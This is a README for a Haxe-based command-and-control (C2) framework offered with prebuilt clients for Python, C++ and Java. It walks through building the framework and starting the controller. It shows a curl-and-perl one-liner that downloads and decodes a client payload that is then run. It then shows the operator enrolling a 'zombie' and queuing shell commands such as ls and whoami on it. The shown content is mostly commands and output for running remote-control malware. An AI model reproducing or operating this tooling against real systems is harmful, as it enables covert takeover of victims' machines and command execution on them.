# Wanna-Be-Hacked C2
A C2 implementation done in Haxe, allowing for cross-platform compilation targeting java, python, cpp, etc...

## Building
The package comes with pre-built packages in the `bin` directory, but if you need to build customized clients/servers, build them through the docker:
```sh
make docker-build
```
This will spawn the new binaries in `bin`, ready for usage.

## Running the Server
Start the C2 controller as follows:
```sh
make docker-controller
```
This will start the server at <http://localhost:8000/>, and it will provide a shell for interacting with the server:
```sh
haxe --main C2Controller --interp
Starting server...
(root)> ? 
help:
	 status - view server status
	 view <client id> - change to focusing on a specific client
	 c <commmand> [command args] - queues a command for the focused client
		 * press enter to view any arrived responses
	 help - do help
	 quit - leave
(root)> 
```

In a separate terminal, download a copy of the client from the server and run it locally:
```sh
curl "http://localhost:8000/wat?type=python" | perl -e 'print pack "H*", <>' > testbin.py
python3 testbin.py
```
(Similarly you can use `type=cpp` for a linux binary, and `type=java` for a jar file)


This will connect a zombie client to the C2 server which will poll for new commands every 3 seconds.
We can see this zombie in the server status:
```sh
(root)> s
status:
    code_tables: {z-0 => client-301.0034148693085}
    command_tables: {client-301.0034148693085 => []}
    return_tables: {client-301.0034148693085 => []}

connected clients:
    z-0
```

To send commands to this zombie, we use the `v` command to select it, then use the `c` command to send commands:
```sh
(root)> v z-0
z-0> c ls
batched coms: [6c73]
z-0> c whoami
batched coms: [6c73,77686f616d69]
z-0> 
```

This will forward commands to the client, which will send back command results the next time it queries.
You can see any results by pressing enter on the terminal:
```sh
z-0> 
bin
C2Client.hx
C2Controller.hx
C2Server.hx
Dockerfile
Makefile
README.md
testbin.py

---
mirror
z-0> 
z-0> 

```

## The End Result
This is an experimental project which shows the future potentials of languages like Haxe.
A singularity is approaching where all code will be univerally available and injectable.


